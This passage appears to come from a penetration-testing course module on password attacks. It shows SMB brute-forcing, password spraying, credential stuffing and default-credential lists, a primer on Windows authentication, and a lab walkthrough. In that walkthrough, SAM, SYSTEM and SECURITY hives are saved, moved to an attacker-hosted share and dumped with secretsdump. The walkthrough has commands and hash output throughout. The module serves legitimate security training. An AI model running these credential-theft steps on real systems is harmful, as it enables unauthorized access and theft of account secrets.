msf6 auxiliary(scanner/smb/smb_login) &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>

rhosts =&gt; <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>

msf6 auxiliary(scanner/smb/smb_login) &gt; run

[+] <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>:<span class="hljs-number">445</span>     - <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>:<span class="hljs-number">445</span> - Succes<span class="hljs-variable">s:</span> <span class="hljs-string">'.\user:password'</span>
[*] <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>:<span class="hljs-number">445</span>     - Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% <span class="hljs-built_in">complete</span>)
[*] Auxiliary module execution completed
</code></pre>
<p>Now we can use <code>NetExec</code> again to view the available shares and what privileges we have for them.</p>
<p><strong>NetExec</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netexec smb <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span> -u <span class="hljs-string">"user"</span> -p <span class="hljs-string">"password"</span> --shares

SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           [+] WINSRV\user:password 
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           [+] Enumerated shares
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           Share           Permissions     Remark
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           -----           -----------     ------
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           ADMIN$                          Remote Admin
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           C$                              <span class="hljs-meta">Default</span> share
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           SHARENAME       READ,WRITE      
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">445</span>    WINSRV           IPC$            READ            Remote IPC
</code></pre>
<p>To communicate with the server via SMB, we can use, for example, the tool <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a>. This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.</p>
<p><strong>Smbclient</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ smbclient -U user <span class="hljs-string">\\\\10.129.42.197\\SHARENAME</span>

Enter WORKGROUP<span class="hljs-string">\user's</span> password: *******

Try <span class="hljs-string">"help"</span> <span class="hljs-keyword">to</span> get a list <span class="hljs-keyword">of</span> possible commands.


smb: <span class="hljs-string">\&gt;</span> ls
  .                                  DR        <span class="hljs-number">0</span>  Thu Jan  <span class="hljs-number">6</span> <span class="hljs-number">18</span>:<span class="hljs-number">48</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span>
  ..                                 DR        <span class="hljs-number">0</span>  Thu Jan  <span class="hljs-number">6</span> <span class="hljs-number">18</span>:<span class="hljs-number">48</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span>
  desktop.ini                       AHS      <span class="hljs-number">282</span>  Thu Jan  <span class="hljs-number">6</span> <span class="hljs-number">15</span>:<span class="hljs-number">44</span>:<span class="hljs-number">52</span> <span class="hljs-number">2022</span>

                <span class="hljs-number">10328063</span> blocks <span class="hljs-keyword">of</span> size <span class="hljs-number">4096.</span> <span class="hljs-number">6074274</span> blocks available
smb: <span class="hljs-string">\&gt;</span>
</code></pre>
<p>To complete the challenge questions, be sure to download the wordlists from the attached network-services.zip archive. <code>It is highly recommended to run your attacks from the Pwnbox</code> as some of the tasks take much longer over the VPN</p>
<hr>
<h2 id="spraying-stuffing-and-defaults">Spraying, Stuffing, and Defaults</h2>
<h3 id="password-spraying">Password spraying</h3>
<p><a href="https://owasp.org/www-community/attacks/Password_Spraying_Attack">Password spraying</a> is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use <code>ChangeMe123!</code> when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.</p>
<p>Depending on the target system, different tools may be used to carry out password spraying attacks. For web applications, <a href="https://portswigger.net/burp">Burp Suite</a> is a strong option, while for Active Directory environments, tools such as <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> or <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> are commonly used.</p>
<p>&#x20; Spraying, Stuffing, and Defaults</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netexec smb <span class="hljs-number">10.100</span><span class="hljs-number">.38</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u &lt;usernames.<span class="hljs-type">list</span>&gt; -p 'ChangeMe123!'
</code></pre>
<h3 id="credential-stuffing">Credential stuffing</h3>
<p><a href="https://owasp.org/www-community/attacks/Credential_stuffing">Credential stuffing</a> is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms (such as email, social media, and enterprise systems), these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system. For example, if we have a list of <code>username:password</code> credentials obtained from a database leak, we can use <code>hydra</code> to perform a credential stuffing attack against an SSH service using the following syntax:</p>
<p>&#x20; Spraying, Stuffing, and Defaults</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -C user_pass<span class="hljs-selector-class">.list</span> ssh:<span class="hljs-comment">//10.100.38.23</span>
</code></pre>
<h3 id="default-credentials">Default credentials</h3>
<p>Many systems—such as routers, firewalls, and databases—come with <code>default credentials</code>. While best practice dictates that administrators change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.</p>
<p>While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">Default Credentials Cheat Sheet</a>, which we can install with <code>pip3</code>.</p>
<p>&#x20; Spraying, Stuffing, and Defaults</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ pip3 install defaultcreds-cheat-sheet
</code></pre>
<p>Once installed, we can use the <code>creds</code> command to search for known default credentials associated with a specific product or vendor.</p>
<p>&#x20; Spraying, Stuffing, and Defaults</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> creds search linksys

+---------------+---------------+------------+
|<span class="hljs-string"> Product       </span>|<span class="hljs-string">    username   </span>|<span class="hljs-string">  password  </span>|
+---------------+---------------+------------+
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">    &lt;blank&gt;    </span>|<span class="hljs-string">  &lt;blank&gt;   </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">    &lt;blank&gt;    </span>|<span class="hljs-string">   admin    </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">    &lt;blank&gt;    </span>|<span class="hljs-string"> epicrouter </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string"> Administrator </span>|<span class="hljs-string">   admin    </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">     admin     </span>|<span class="hljs-string">  &lt;blank&gt;   </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">     admin     </span>|<span class="hljs-string">   admin    </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">    comcast    </span>|<span class="hljs-string">    1234    </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">      root     </span>|<span class="hljs-string">  orion99   </span>|
|<span class="hljs-string"> linksys       </span>|<span class="hljs-string">      user     </span>|<span class="hljs-string">  tivonpw   </span>|
|<span class="hljs-string"> linksys (ssh) </span>|<span class="hljs-string">     admin     </span>|<span class="hljs-string">   admin    </span>|
|<span class="hljs-string"> linksys (ssh) </span>|<span class="hljs-string">     admin     </span>|<span class="hljs-string">  password  </span>|
|<span class="hljs-string"> linksys (ssh) </span>|<span class="hljs-string">    linksys    </span>|<span class="hljs-string">  &lt;blank&gt;   </span>|
|<span class="hljs-string"> linksys (ssh) </span>|<span class="hljs-string">      root     </span>|<span class="hljs-string">   admin    </span>|
+---------------+---------------+------------+
</code></pre>
<p>In addition to publicly available lists and tools, default credentials can often be found in product documentation, which typically outlines the steps required to set up a service. While some devices and applications prompt the user to set a password during installation, others use a default—often weak—password.</p>
<p>Let&#39;s imagine we have identified certain applications in use on a customer&#39;s network. After researching the default credentials online, we can combine them into a new list, formatted as <code>username:password</code>, and reuse the previously mentioned <code>hydra</code> command to attempt access.</p>
<p>Beyond applications, default credentials are also commonly associated with routers. One such list is available <a href="https://www.softwaretestinghelp.com/default-router-username-and-password-list/">here</a>. While it is less likely that router credentials remain unchanged (since these devices are critical to network security), oversights do occur. Routers used in internal testing environments, for example, may be left with default settings and can be exploited to gain further access.</p>
<table>
<thead>
<tr>
<th><strong>Router Brand</strong></th>
<th><strong>Default IP Address</strong></th>
<th><strong>Default Username</strong></th>
<th><strong>Default Password</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>3Com</td>
<td><a href="http://192.168.1.1">http://192.168.1.1</a></td>
<td>admin</td>
<td>Admin</td>
</tr>
<tr>
<td>Belkin</td>
<td><a href="http://192.168.2.1">http://192.168.2.1</a></td>
<td>admin</td>
<td>admin</td>
</tr>
<tr>
<td>BenQ</td>
<td><a href="http://192.168.1.1">http://192.168.1.1</a></td>
<td>admin</td>
<td>Admin</td>
</tr>
<tr>
<td>D-Link</td>
<td><a href="http://192.168.0.1">http://192.168.0.1</a></td>
<td>admin</td>
<td>Admin</td>
</tr>
<tr>
<td>Digicom</td>
<td><a href="http://192.168.1.254">http://192.168.1.254</a></td>
<td>admin</td>
<td>Michelangelo</td>
</tr>
<tr>
<td>Linksys</td>
<td><a href="http://192.168.1.1">http://192.168.1.1</a></td>
<td>admin</td>
<td>Admin</td>
</tr>
<tr>
<td>Netgear</td>
<td><a href="http://192.168.0.1">http://192.168.0.1</a></td>
<td>admin</td>
<td>password</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="windows-authentication-process">Windows Authentication Process</h2>
<p>The <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Windows client authentication process</a> involves multiple modules responsible for logon, credential retrieval, and verification. Among the various authentication mechanisms in Windows, Kerberos is one of the most widely used and complex. The <a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">Local Security Authority</a> (<code>LSA</code>) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (SIDs).</p>
<p>The security subsystem maintains security policies and user accounts on a computer system. On a Domain Controller, these policies and accounts apply to the entire domain and are stored in Active Directory. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.</p>
<p><strong>Windows authentication process diagram</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/Auth_process1.png" alt="Diagram of Windows Authentication Process showing interactions between WinLogon.exe, LogonUI, lsass.exe, and authentication packages like NTLM and Kerberos."></p>
<p>Local interactive logon is handled through the coordination of several components: the logon process (<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2228450\&amp;seqNum=8">WinLogon</a>), the logon user interface process (<code>LogonUI</code>), credential providers, the Local Security Authority Subsystem Service (<code>LSASS</code>), one or more authentication packages, and either the Security Accounts Manager (<code>SAM</code>) or Active Directory. Authentication packages, in this context, are Dynamic-Link Libraries (DLLs) responsible for performing authentication checks. For example, for non-domain-joined and interactive logins, the <code>Msv1_0.dll</code> authentication package is typically used.</p>
<p><code>WinLogon</code> is a trusted system process responsible for managing security-related user interactions, such as:</p>
<ul>
<li>Launching <code>LogonUI</code> to prompt for credentials at login</li>
<li>Handling password changes</li>
<li>Locking and unlocking the workstation</li>
</ul>
<p>To obtain a user&#39;s account name and password, WinLogon relies on credential providers installed on the system. These credential providers are <code>COM</code> objects implemented as DLLs.</p>
<p>WinLogon is the only process that intercepts login requests from the keyboard, which are sent via RPC messages from <code>Win32k.sys</code>. At logon, it immediately launches the <code>LogonUI</code> application to present the graphical user interface. Once the user&#39;s credentials are collected by the credential provider, WinLogon passes them to the Local Security Authority Subsystem Service (<code>LSASS</code>) to authenticate the user.</p>
<p><strong>LSASS</strong></p>
<p>The <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service</a> (<code>LSASS</code>) is comprised of multiple modules and governs all authentication processes. Located at <code>%SystemRoot%\System32\Lsass.exe</code>in the file system, it is responsible for enforcing the local security policy, authenticating users, and forwarding security audit logs to the <code>Event Log</code>. In essence, LSASS serves as the gatekeeper in Windows-based operating systems. A more detailed illustration of the LSASS architecture can be found <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760\(v=technet.10\">here</a>?redirectedfrom=MSDN).</p>
<table>
<thead>
<tr>
<th><strong>Authentication Packages</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Lsasrv.dll</code></td>
<td>The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.</td>
</tr>
<tr>
<td><code>Msv1_0.dll</code></td>
<td>Authentication package for local machine logons that don&#39;t require custom authentication.</td>
</tr>
<tr>
<td><code>Samsrv.dll</code></td>
<td>The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.</td>
</tr>
<tr>
<td><code>Kerberos.dll</code></td>
<td>Security package loaded by the LSA for Kerberos-based authentication on a machine.</td>
</tr>
<tr>
<td><code>Netlogon.dll</code></td>
<td>Network-based logon service.</td>
</tr>
<tr>
<td><code>Ntdsa.dll</code></td>
<td>This library is used to create new records and folders in the Windows registry.</td>
</tr>
</tbody>
</table>
<p>Source: <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Docs</a>.</p>
<p>Each interactive logon session creates a separate instance of the WinLogon service. The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/gina">Graphical Identification and Authentication</a> (<code>GINA</code>) architecture is loaded into the process area used by WinLogon, receives and processes the credentials, and invokes the authentication interfaces via the <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser">LSALogonUser</a> function.</p>
<p><strong>SAM database</strong></p>
<p>The <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\">Security Account Manager</a>?redirectedfrom=MSDN) (<code>SAM</code>) is a database file in Windows operating systems that stores user account credentials. It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access. User passwords are stored as hashes in the registry, typically in the form of either <code>LM</code> or <code>NTLM</code> hashes. The SAM file is located at <code>%SystemRoot%\system32\config\SAM</code> and is mounted under <code>HKLM\SAM</code>. Viewing or accessing this file requires <code>SYSTEM</code> level privileges.</p>
<p>Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (<code>DC</code>) must validate the credentials from the Active Directory database (<code>ntds.dit</code>), which is stored in <code>%SystemRoot%\ntds.dit</code>.</p>
<p>To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called <code>SYSKEY</code> (<code>syskey.exe</code>). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.</p>
<p><strong>Credential Manager</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/authn_credman_credprov.png" alt="Diagram of Windows logon process showing interactions between user input, Logon UI, Credential Provider, WinLogon, and Local Security Authority."></p>
<p>Source: <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Docs</a>.</p>
<p>Credential Manager is a built-in feature of all Windows operating systems that allows users to store and manage credentials used to access network resources, websites, and applications. These saved credentials are stored per user profile in the user&#39;s <code>Credential Locker</code>. The credentials are encrypted and stored at the following location:</p>
<p>&#x20; Windows Authentication Process</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\[</span>Username]<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\[</span>Vault/Credentials]\
</code></pre>
<p>There are various methods to decrypt credentials saved using Credential Manager. We will practice hands-on with some of these methods in this module.</p>
<p><strong>NTDS</strong></p>
<p>It is very common to encounter network environments where Windows systems are joined to a Windows domain. This setup simplifies centralized management, allowing administrators to efficiently oversee all systems within their organization. In such environments, logon requests are sent to Domain Controllers within the same Active Directory forest. Each Domain Controller hosts a file called <code>NTDS.dit</code>, which is synchronized across all Domain Controllers, with the exception of <a href="https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema">Read-Only Domain Controllers (RODCs)</a>.</p>
<p><code>NTDS.dit</code> is a database file that stores Active Directory data, including but not limited to:</p>
<ul>
<li>User accounts (username &amp; password hash)</li>
<li>Group accounts</li>
<li>Computer accounts</li>
<li>Group policy objects</li>
</ul>
<p>Later in this module, we will explore methods for extracting credentials from the <code>NTDS.dit</code> file.</p>
<p>Now that we have gone through a primer on credential storage concepts, let&#39;s study the various attacks we can perform to extract credentials and further our access during assessments.</p>
<hr>
<h2 id="attacking-sam-system-and-security">Attacking SAM, SYSTEM, and SECURITY</h2>
<p>With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target. Let&#39;s walk through this process together using a target host. Feel free to follow along by spawning the target box provided in this section.</p>
<h3 id="registry-hives">Registry hives</h3>
<p>There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:</p>
<table>
<thead>
<tr>
<th>Registry Hive</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>HKLM\SAM</code></td>
<td>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</td>
</tr>
<tr>
<td><code>HKLM\SYSTEM</code></td>
<td>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</td>
</tr>
<tr>
<td><code>HKLM\SECURITY</code></td>
<td>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</td>
</tr>
</tbody>
</table>
<p>We can back up these hives using the <code>reg.exe</code> utility.</p>
<p><strong>Using reg.exe to copy registry hives</strong></p>
<p>By launching <code>cmd.exe</code> with administrative privileges, we can use <code>reg.exe</code> to save copies of the registry hives. Run the following commands:</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-cmd-session">C:\WINDOWS\system32&gt; reg<span class="hljs-selector-class">.exe</span> save hklm\sam C:\sam<span class="hljs-selector-class">.save</span>

The operation completed successfully.

C:\WINDOWS\system32&gt; reg<span class="hljs-selector-class">.exe</span> save hklm\system C:\system<span class="hljs-selector-class">.save</span>

The operation completed successfully.

C:\WINDOWS\system32&gt; reg<span class="hljs-selector-class">.exe</span> save hklm\security C:\security<span class="hljs-selector-class">.save</span>

The operation completed successfully.
</code></pre>
<p>If we&#39;re only interested in dumping the hashes of local users, we need only <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code>. However, it&#39;s often useful to save <code>HKLM\SECURITY</code> as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, we can use various methods to transfer them to our attack host. In this case, we&#39;ll use Impacket&#39;s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver</a> in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.</p>
<p><strong>Creating a share with smbserver</strong></p>
<p>To create the share, we simply run <code>smbserver.py -smb2support</code>, specify a name for the share (e.g., <code>CompData</code>), and point to the local directory on our attack host where the hive copies will be stored (e.g., <code>/home/ltnbob/Documents</code>). The <code>-smb2support</code> flag ensures compatibility with newer versions of SMB. If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1">numerous severe vulnerabilities</a> and publicly available exploits.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo python3 /</span>usr<span class="hljs-regexp">/share/</span>doc<span class="hljs-regexp">/python3-impacket/</span>examples<span class="hljs-regexp">/smbserver.py -smb2support CompData /</span>home<span class="hljs-regexp">/ltnbob/</span>Documents/

Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[*] Config file parsed
[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8<span class="hljs-number">-1670</span><span class="hljs-number">-01</span>D3<span class="hljs-number">-1278</span><span class="hljs-number">-5</span>A47BF6EE188 <span class="hljs-string">V:</span><span class="hljs-number">3.0</span>
[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112<span class="hljs-number">-3610</span><span class="hljs-number">-9833</span><span class="hljs-number">-46</span>C3F87E345A <span class="hljs-string">V:</span><span class="hljs-number">1.0</span>
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
<p>Once the share is running on our attack host, we can use the <code>move</code> command on the Windows target to transfer the hive copies to the share.</p>
<p><strong>Moving hive copies to share</strong></p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\&gt; <span class="hljs-selector-tag">move</span> <span class="hljs-selector-tag">sam</span><span class="hljs-selector-class">.save</span> \\10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.15</span><span class="hljs-selector-class">.16</span>\<span class="hljs-selector-tag">CompData</span>
        1 <span class="hljs-selector-tag">file</span>(<span class="hljs-selector-tag">s</span>) <span class="hljs-selector-tag">moved</span>.

<span class="hljs-selector-tag">C</span>:\&gt; <span class="hljs-selector-tag">move</span> <span class="hljs-selector-tag">security</span><span class="hljs-selector-class">.save</span> \\10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.15</span><span class="hljs-selector-class">.16</span>\<span class="hljs-selector-tag">CompData</span>
        1 <span class="hljs-selector-tag">file</span>(<span class="hljs-selector-tag">s</span>) <span class="hljs-selector-tag">moved</span>.

<span class="hljs-selector-tag">C</span>:\&gt; <span class="hljs-selector-tag">move</span> <span class="hljs-selector-tag">system</span><span class="hljs-selector-class">.save</span> \\10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.15</span><span class="hljs-selector-class">.16</span>\<span class="hljs-selector-tag">CompData</span>
        1 <span class="hljs-selector-tag">file</span>(<span class="hljs-selector-tag">s</span>) <span class="hljs-selector-tag">moved</span>.
</code></pre>
<p>We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using <code>ls</code> to list the files.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls

sam.<span class="hljs-built_in">save</span>  security.<span class="hljs-built_in">save</span>  <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span>
</code></pre>
<h3 id="dumping-hashes-with-secretsdump">Dumping hashes with secretsdump</h3>
<p>One particularly useful tool for dumping hashes offline is Impacket&#39;s <code>secretsdump</code>. Impacket is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the <code>locate</code> command:</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ locate secretsdump
</code></pre>
<p>Using <code>secretsdump</code> is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python3 /</span>usr<span class="hljs-regexp">/share/</span>doc<span class="hljs-regexp">/python3-impacket/</span>examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[*] Target system <span class="hljs-string">bootKey:</span> <span class="hljs-number">0x4d8c7cff8a543fbf245a363d2ffce518</span>
[*] Dumping local SAM hashes (<span class="hljs-string">uid:</span><span class="hljs-string">rid:</span><span class="hljs-string">lmhash:</span>nthash)
<span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">WDAGUtilityAccount:</span><span class="hljs-number">504</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">3</span><span class="hljs-string">dd5a5ef0ed25b8d6add8b2805cce06b:</span>::
<span class="hljs-string">defaultuser0:</span><span class="hljs-number">1000</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">683</span><span class="hljs-string">b72db605d064397cf503802b51857:</span>::
<span class="hljs-string">bob:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">64</span><span class="hljs-string">f12cddaa88057e06a81b54e73b949b:</span>::
<span class="hljs-string">sam:</span><span class="hljs-number">1002</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">6</span><span class="hljs-string">f8c3f4d3869a10f3b4f0522f537fd33:</span>::
<span class="hljs-string">rocky:</span><span class="hljs-number">1003</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">184</span><span class="hljs-string">ecdda8cf1dd238d438c4aea4d560d:</span>::
<span class="hljs-string">ITlocal:</span><span class="hljs-number">1004</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">f7eb9c06fafaa23c4bcf22ba6781c1e2:</span>::
[*] Dumping cached domain logon information (domain/<span class="hljs-string">username:</span>hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
<span class="hljs-string">dpapi_machinekey:</span><span class="hljs-number">0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643</span>
<span class="hljs-string">dpapi_userkey:</span><span class="hljs-number">0x7995f82c5de363cc012ca6094d381671506fd362</span>
[*] NL$KM 
 <span class="hljs-number">0000</span>   D7 <span class="hljs-number">0</span>A F4 B9 <span class="hljs-number">1</span>E <span class="hljs-number">3</span>E <span class="hljs-number">77</span> <span class="hljs-number">34</span>  <span class="hljs-number">94</span> <span class="hljs-number">8</span>F C4 <span class="hljs-number">7</span>D AC <span class="hljs-number">8</span>F <span class="hljs-number">60</span> <span class="hljs-number">69</span>   .....&gt;w4...}..`i
 <span class="hljs-number">0010</span>   <span class="hljs-number">52</span> E1 <span class="hljs-number">2</span>B <span class="hljs-number">74</span> FF B2 <span class="hljs-number">08</span> <span class="hljs-number">5</span>F  <span class="hljs-number">59</span> FE <span class="hljs-number">32</span> <span class="hljs-number">19</span> D6 A7 <span class="hljs-number">2</span>C F8   R.+t..._Y<span class="hljs-number">.2</span>...,.
 <span class="hljs-number">0020</span>   E2 A4 <span class="hljs-number">80</span> E0 <span class="hljs-number">0</span>F <span class="hljs-number">3</span>D F8 <span class="hljs-number">48</span>  <span class="hljs-number">44</span> <span class="hljs-number">98</span> <span class="hljs-number">87</span> E1 C9 CD <span class="hljs-number">4</span>B <span class="hljs-number">28</span>   .....=.HD.....K(
